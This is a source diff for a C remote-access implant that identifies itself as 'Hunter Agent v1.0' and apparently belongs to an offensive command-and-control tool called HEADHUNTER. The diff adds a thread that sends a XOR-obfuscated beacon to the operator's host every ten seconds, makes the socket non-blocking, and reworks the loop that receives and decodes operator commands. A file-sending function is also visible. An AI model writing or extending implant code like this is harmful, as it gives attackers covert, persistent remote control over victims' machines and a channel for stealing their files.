@@ -16,6 +16,26 @@ char* CLIENT_IP = LHOST;
 int CLIENT_PORT = PORT;
 char* key = KEY;
 char buf[MAXBUF];
+int beaconing;
+
+DWORD WINAPI Callback(LPVOID lpParam) {
+    SOCKET sock = *((SOCKET*)lpParam);
+
+    char* callback = "--HEADHUNTER BEACON--";
+    char* xorcallback = XOR(callback, key, strlen(callback), strlen(key));
+
+    while (1) {
+    	int n = send(sock , xorcallback, strlen(callback), 0);
+	if(n == SOCKET_ERROR){
+		if(WSAGetLastError() == WSAEWOULDBLOCK){
+			Sleep(100);
+		}
+	}
+	Sleep(10000);
+    }
+
+    return 0;
+}
 
 int sendfile(FILE* fp, int fd, char* key)
 {
@@ -64,12 +84,24 @@ int main(void) {
 	}
 #endif
 
+	u_long mode = 1;
+	ioctlsocket(sock, FIONBIO, &mode);
+
+	HANDLE hThread = CreateThread(NULL, 0, Callback, &sock, 0, NULL);
+	Sleep(1000);
 	char* xorhello = XOR("Hunter Agent v1.0\n", key, 18, keylen);
         send(sock, xorhello, 18, 0);
 	free(xorhello);
-
-        while((n = recv(sock, buf, MAXBUF, 0)) > 0)
+        while((n = recv(sock, buf, MAXBUF, 0)) != 0)
         {
+		if(n == SOCKET_ERROR){
+			if(WSAGetLastError() == WSAEWOULDBLOCK){
+				Sleep(100);
+				continue;
+			}
+
+			Sleep(100);
+		}
         	char* xorbuf = XOR(buf, key, n, keylen);
                 // TODO: Revamp argument parsing (there's a better way! :)
                 if(strncmp(xorbuf, "help\n", 5) == 0)
